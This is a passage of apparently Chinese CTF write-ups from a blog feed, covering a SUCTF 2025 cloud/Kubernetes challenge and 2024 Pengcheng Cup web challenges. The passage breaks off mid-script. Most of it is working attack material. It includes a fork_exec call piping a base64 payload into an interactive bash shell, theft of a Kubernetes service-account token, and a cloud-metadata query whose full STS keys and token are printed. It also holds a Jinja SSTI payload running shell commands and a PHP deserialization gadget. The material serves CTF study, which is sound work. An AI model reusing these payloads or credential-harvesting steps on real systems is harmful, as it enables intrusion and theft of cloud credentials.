*(os.pipe()), <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>这样可以rce了。</p><p>弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> _posixsubprocess<br><br>_posixsubprocess.fork_exec([<span class="hljs-string">b&quot;&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;&#123;echo,xxxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>], [<span class="hljs-string">b&quot;/bin/bash&quot;</span>], <span class="hljs-literal">True</span>, (), <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, *(os.pipe()), <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/SUCTF2025/d2414b32-ec35-4c77-8a29-a3a8598c3f30.png" alt="d2414b32-ec35-4c77-8a29-a3a8598c3f30"></p><p>&#x2F;var&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs smali">eyJhbGciOiJSUzI1NiIsImtpZCI6IkRucGZMWXZWdjlIcUx5bGNlWGVELWljN0NqUlo4bHNFWGlKVDNBX0hhUm8ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJ<br>rM3MiXSwiZXhwIjoxNzY4MjAyNjE4LCJpYXQiOjE3MzY2NjY2MTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNGVlODQyYzctYzg4Zi00NjExLWFkNTgtM<br>2VmMDBlMzc5ZTNjIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiaXpicDFjbzZwemhmZ3hreXF4NHZmd3oiLCJ1aWQiOiIxODhlNDBhNC1kOTM3LTQ5ODMtOThhOS0<br>5ZDY0NjUzODM0NDMifSwicG9kIjp7Im5hbWUiOiJjdGYtZGVwbG95bWVudC03ZDg1ZDg0ODg4LTh3YzduIiwidWlkIjoiMWVlNjU5ZjctMWIzMS00NDY5LTlhZWItNzFlMzNhNGQ1N2Y4In0sInNlcnZpY2VhY2NvdW50I<br>jp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiMWM0MGZjYWYtM2NkZS00OGUyLTkzOTYtZDBlOGY3ZTlhZjcyIn0sIndhcm5hZnRlciI6MTczNjY3MDIyNX0sIm5iZiI6MTczNjY2NjYxOCwic3ViIjoic3lzdGVtOnNlcnZ<br>pY2VhY2NvdW50OmRlZmF1bHQ6ZGVmYXVsdCJ9.p_VyIStlWJbygScXdozYOyuBWut9LDC5Kwb2Y5YK66AG1tf4RKDtaeS47v3twhxfO9SdInudxS0-Gp7fqnqVy6M1-AuLYx3_UeBIvXRPTfmU0nCHIkSYVYDwMCn4KMq3<br>dp3HsoW_LE3M1oykLRe3z80-72YN4pbNXiCHLdgA5sKXl1xOJidpa7mu-Ta7UJn-hV3-5F4HIqHaIMCw9_r67suLoQX7JcCr1rIf0KYX4C12GpeXfeAR2d-i66dhrzp9rCyPx942CkhTtqegiQ-QqgDYAWDNYvOnpgV7S8<br>lKuURMKGlzuBM1nffuebF5wVoohurVjFwnBk7m99A9CmqERQ<br></code></pre></td></tr></table></figure><p>发现serviceaccount相关文件，连接api执行can-i发现没有权限，换其他方案</p><p>CDK扫描结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs bash">CDK (Container DucK)<br>CDK Version(GitCommit): 251f18c614f925f26569f9cc6177c3b3fd656bd2<br>Zero-dependency cloudnative k8s/docker/serverless penetration toolkit by cdxy &amp; neargle<br>Find tutorial, configuration and use-case <span class="hljs-keyword">in</span> https://github.com/cdk-team/CDK/<br><br>[  Information Gathering - System Info  ]<br>        /usr/bin/chfn<br>        /usr/bin/chsh<br>        /usr/bin/gpasswd<br>        /usr/bin/mount<br>        /usr/bin/newgrp<br>        /usr/bin/passwd<br>        /usr/bin/su<br>        /usr/bin/umount<br>        /bin/chfn<br>        /bin/chsh<br>        /bin/gpasswd<br>        /bin/mount<br>        /bin/newgrp<br>        /bin/passwd<br>        /bin/su<br>        /bin/umount<br><br>[  Information Gathering - Services  ]<br><br>[  Information Gathering - Commands and Capabilities  ]<br>        CapInh: 0000000000000000<br>        CapPrm: 0000000000000000<br>        CapEff: 0000000000000000<br>        CapBnd: 00000000a80425fb<br>        CapAmb: 0000000000000000<br>        Cap decode: 0x0000000000000000 = <br>[*] Maybe you can exploit the Capabilities below:<br><br>[  Information Gathering - Mounts  ]<br>0:389 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/783/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/782/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/781/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/114/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/113/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/112/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/111/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/110/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/109/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/108/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/107/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/106/fs,upperdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/2136/fs,workdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/2136/work<br>0:447 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw<br>0:448 / /dev rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64<br>0:449 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666<br>0:394 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw<br>0:414 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro<br>0:30 / /sys/fs/cgroup ro,nosuid,nodev,noexec,relatime - cgroup2 cgroup rw,nsdelegate,memory_recursiveprot<br>252:3 /var/lib/kubelet/pods/cf3c0f7c-6f8e-4ec7-96ab-afaabf79f3b9/etc-hosts /etc/hosts rw,relatime - ext4 /dev/vda3 rw<br>252:3 /var/lib/kubelet/pods/cf3c0f7c-6f8e-4ec7-96ab-afaabf79f3b9/containers/vuln-container/f30344ca /dev/termination-log rw,relatime - ext4 /dev/vda3 rw<br>252:3 /var/lib/rancher/k3s/agent/containerd/io.containerd.grpc.v1.cri/sandboxes/3d083d23aa076f9e4d21b1499fc54b3c610ec06454d7f646e19229c0e660f714/hostname /etc/hostname rw,relatime - ext4 /dev/vda3 rw<br>252:3 /var/lib/rancher/k3s/agent/containerd/io.containerd.grpc.v1.cri/sandboxes/3d083d23aa076f9e4d21b1499fc54b3c610ec06454d7f646e19229c0e660f714/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/vda3 rw<br>0:368 / /dev/shm rw,relatime - tmpfs shm rw,size=65536k,inode64<br>0:366 / /run/secrets/kubernetes.io/serviceaccount ro,relatime - tmpfs tmpfs rw,size=7441152k,inode64<br>0:447 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw<br>0:447 /fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw<br>0:447 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw<br>0:447 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw<br>0:447 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw<br>0:450 / /proc/acpi ro,relatime - tmpfs tmpfs ro,inode64<br>0:448 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64<br>0:448 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64<br>0:448 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64<br>0:451 / /proc/scsi ro,relatime - tmpfs tmpfs ro,inode64<br>0:452 / /sys/firmware ro,relatime - tmpfs tmpfs ro,inode64<br>0:453 / /sys/devices/virtual/powercap ro,relatime - tmpfs tmpfs ro,inode64<br><br>[  Information Gathering - Net Namespace  ]<br>        container net namespace isolated.<br><br>[  Information Gathering - Sysctl Variables  ]<br><br>[  Information Gathering - DNS-Based Service Discovery  ]<br>error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host<br>error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host<br><br>[  Discovery - K8s API Server  ]<br>err found <span class="hljs-keyword">in</span> post request, error response code: 401 Unauthorized.<br>        api-server forbids anonymous request.<br>        response:&#123;<span class="hljs-string">&quot;kind&quot;</span>:<span class="hljs-string">&quot;Status&quot;</span>,<span class="hljs-string">&quot;apiVersion&quot;</span>:<span class="hljs-string">&quot;v1&quot;</span>,<span class="hljs-string">&quot;metadata&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;Failure&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;Unauthorized&quot;</span>,<span class="hljs-string">&quot;reason&quot;</span>:<span class="hljs-string">&quot;Unauthorized&quot;</span>,<span class="hljs-string">&quot;code&quot;</span>:401&#125;<br><br><br>[  Discovery - K8s Service Account  ]<br>        service-account is available<br>err found <span class="hljs-keyword">in</span> post request, error response code: 403 Forbidden.<br><br>[  Discovery - Cloud Provider Metadata API  ]<br>        Alibaba Cloud Metadata API available <span class="hljs-keyword">in</span> http://100.100.100.200/latest/meta-data/<br>        Docs: https://help.aliyun.com/knowledge_detail/49122.html<br><br>[  Exploit Pre - Kernel Exploits  ]<br>[+] [CVE-2022-0847] DirtyPipe<br><br>   Details: https://dirtypipe.cm4all.com/<br>   Exposure: less probable<br>   Tags: ubuntu=(20.04|21.04),debian=11<br>   Download URL: https://haxx.in/files/dirtypipez.c<br><br>[+] [CVE-2021-22555] Netfilter heap out-of-bounds write<br><br>   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html<br>   Exposure: less probable<br>   Tags: ubuntu=20.04&#123;kernel:5.8.0-*&#125;<br>   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c<br>   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c<br>   Comments: ip_tables kernel module must be loaded<br><br><br><br>[  Information Gathering - Sensitive Files  ]<br>        /.bashrc - /etc/skel/.bashrc<br>        /serviceaccount - /run/secrets/kubernetes.io/serviceaccount<br><br>[  Information Gathering - ASLR  ]<br><br>[  Information Gathering - Cgroups  ]<br>        0::/<br></code></pre></td></tr></table></figure><p>发现阿里云metadata，在ram中找到一个STS token</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json">http<span class="hljs-punctuation">:</span><span class="hljs-comment">//100.100.100.200/latest/meta-data/ram/security-credentials/oss-root</span><br><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;AccessKeyId&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;STS.NTfZuo3n761cQMys2MNiNBo9a&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;AccessKeySecret&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;Expiration&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2025-01-12T14:05:03Z&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;SecurityToken&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;LastUpdated&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2025-01-12T08:05:03Z&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;Code&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Success&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>存入阿里云cli STS登录，看到bucket，ls后为空，想到版本控制加入–all-versions</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">| 1 | suctf-flag-bucket | N/A | 0 | 0.00 B | cn-hangzhou | https://suctf-flag-bucket.oss-cn-hangzhou.aliyuncs.com |<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#aliyun oss ls oss://suctf-flag-bucket  --all-versions</span><br>LastModifiedTime                   Size(B)  StorageClass  ETAG                                  VERSIONID                                                           IS-LATEST   DELETE-MARKER  ObjectName<br>2025-01-11 21:30:39 +0800 CST            0                                                      CAEQmwIYgoDA2sKe1qIZIiA2NmViNDQ2NWVjNzk0MzQ1YjdiNjdkYTE5ZjYwNTQyMg--  <span class="hljs-literal">true</span>        <span class="hljs-literal">true</span>           oss://suctf-flag-bucket/oss-flagx<br>2025-01-11 21:30:03 +0800 CST           76      Standard  7246CE228374D17256B45DDF88E891A0      CAEQmwIYgYDA6Lad1qIZIiAyMjBhNWVmMDRjYzY0MDI3YjhiODU3ZDQ2MDc1MjZhOA--  <span class="hljs-literal">false</span>       <span class="hljs-literal">false</span>          oss://suctf-flag-bucket/oss-flag<br>Object Number is: 2<br></code></pre></td></tr></table></figure><p>看到版本，读取flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#aliyun oss cat oss://suctf-flag-bucket/oss-flag --version-id CAEQmwIYgYDA6Lad1qIZIiAyMjBhNWVmMDRjYzY0MDI3YjhiODU3ZDQ2MDc1MjZhOA--</span><br><br>SUCTF&#123;kubernetes_is_not_only_the_cloud-a09f950a-eb89-46f4-b381-fec7c9a0023a&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024鹏城杯web全wp</title>
    <link href="/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/"/>
    <url>/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/</url>
    
    <content type="html"><![CDATA[<h2 id="python口算-pcb2024"><a href="#python口算-pcb2024" class="headerlink" title="python口算-pcb2024"></a>python口算-pcb2024</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;http://192.168.18.28&quot;</span><br><br><span class="hljs-comment"># 定义计算表达式的函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_expression</span>(<span class="hljs-params">expression</span>):<br>    <span class="hljs-comment"># 使用正则表达式匹配数字和运算符</span><br>    tokens = re.findall(<span class="hljs-string">r&#x27;\d+|[+\-*/]&#x27;</span>, expression)<br><br>    <span class="hljs-comment"># 将 tokens 列表组合成一个字符串并使用 eval 计算结果</span><br>    result = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(tokens))<br><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-comment"># 测试表达式</span><br>res = requests.get(url+<span class="hljs-string">&quot;/calc&quot;</span>)<br><span class="hljs-built_in">print</span>(res.text)<br>result = calculate_expression(res.text)<br><br>res = requests.get(url+<span class="hljs-string">f&quot;?answer=<span class="hljs-subst">&#123;result&#125;</span>&amp;Submit=%E6%8F%90%E4%BA%A4&quot;</span>)<br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><p>得到&#x2F;static&#x2F;f4dd790b-bc4e-48de-b717-903d433c597f</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">solved=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">global</span> current_expr<br><br>    <span class="hljs-comment"># 前端计算</span><br>    .....<br>    .....<br>    <span class="hljs-comment"># 通过计算</span><br><br>    username = <span class="hljs-string">&#x27;ctfer!&#x27;</span><br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>):<br>        username = request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        <span class="hljs-keyword">if</span> whitelist_filter(username,whitelist_patterns):<br>            <span class="hljs-keyword">if</span> blacklist_filter(username):<br>                <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&quot;filtered&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;你过关！&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&quot;filtered&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, username=username, hint=<span class="hljs-string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)<br></code></pre></td></tr></table></figure><p>目测是一个username的ssti，绕一下过滤，用$IFS绕空格</p><p>最终脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;http://192.168.18.28&quot;</span><br><br><span class="hljs-comment"># 定义计算表达式的函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_expression</span>(<span class="hljs-params">expression</span>):<br>    <span class="hljs-comment"># 使用正则表达式匹配数字和运算符</span><br>    tokens = re.findall(<span class="hljs-string">r&#x27;\d+|[+\-*/]&#x27;</span>, expression)<br><br>    <span class="hljs-comment"># 将 tokens 列表组合成一个字符串并使用 eval 计算结果</span><br>    result = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(tokens))<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-comment"># 测试表达式</span><br>res = requests.get(url + <span class="hljs-string">&quot;/calc&quot;</span>)<br>result = calculate_expression(res.text)<br><br>params = &#123;<span class="hljs-string">&quot;answer&quot;</span>: result&#125;<br>data = &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat$IFS/f*&#x27;).read()&#125;&#125;&quot;</span>&#125;<br><br>res = requests.post(url, params=params, data=data)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="fileread-pcb2024"><a href="#fileread-pcb2024" class="headerlink" title="fileread-pcb2024"></a>fileread-pcb2024</h2><p>直接文件读取，但是找不到flag，打cnext</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls1</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$arr</span>;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls2</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=/proc/self/cmdline&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$txt</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cls1</span>();<br><span class="hljs-variable">$a</span> -&gt;cls = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cls2</span>();<br><span class="hljs-variable">$a</span> -&gt;arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;1&quot;</span>=&gt;<span class="hljs-string">&quot;fileput&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 